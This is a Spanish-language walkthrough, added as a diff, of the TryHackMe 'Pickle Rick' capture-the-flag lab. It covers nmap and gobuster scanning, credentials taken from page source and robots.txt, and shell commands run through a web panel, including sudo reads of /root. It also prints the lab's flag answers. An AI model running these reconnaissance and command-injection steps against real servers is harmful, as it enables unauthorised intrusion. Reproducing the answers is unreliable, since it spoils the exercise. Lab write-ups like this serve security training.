@@ -1,0 +1,66 @@
+TryHackMe
+Pickle Rick
+
+nmap:
+
+    nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.86.33 -oN nmap
+
+    • 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+    • 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+
+Dentro del código HTML del puerto 80 encontramos "Username: R1ckRul3s".
+
+Fuzzing:
+
+    gobuster dir -u http://10.10.86.33 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+    • /assets
+
+    gobuster dir -u http://10.10.86.33 -w /usr/share/wordlists/dirb/common.txt
+
+    • /assets
+    • /index.html
+    • robots.txt
+
+En "robots.txt" encontramos "Wubbalubbadubdub".
+
+Luego de dar vueltas durante 1 hora, se nos ocurre la idea de buscar "login.php" y, en efecto, lo encontramos. De ahora en adelante, siempre lo buscaremos de forma manual. >:C
+
+En login.php introducimos usuario: "R1ckRul3s" y pass: "Wubbalubbadubdub". Al ingresar al panel, encontramos un input de comandos. Al introducir "ls", nos encontramos con lo siguiente:
+
+• Sup3rS3cretPickl3Ingred.txt
+• assets
+• clue.txt
+• denied.php
+• index.html
+• login.php
+• portal.php
+• robots.txt
+
+No nos permite leerlos directamente en el panel, pero podemos intuir que al estar alojados dentro del servidor estarán en una página.
+
+/Sup3rS3cretPickl3Ingred.txt
+    • mr. meeseek hair
+
+/clue.txt
+    • Look around the file system for the other ingredient.
+
+Al buscar desde la raíz "find / -name "rick" 2>/dev/null", encontramos el directorio "/rick". Comenzamos a buscar dentro de ese directorio. Encontramos "/home/rick/second ingredients".
+
+Intentamos leer el archivo con "cat", pero el comando está desactivado. Al probar con "less", sí podemos leer:
+
+less /home/rick/"second ingredients"
+    • 1 jerry tear
+
+Luego de escanear mucho en el servidor y consultar en el chat GPT cómo leer la carpeta "/root", vemos que al colocar:
+
+    sudo ls /root
+
+Nos entrega 2 archivos:
+
+• 3rd.txt
+• snap
+
+Al utilizar "sudo less /root/3rd.txt":
+
+    • 3rd ingredients: fleeb juice"
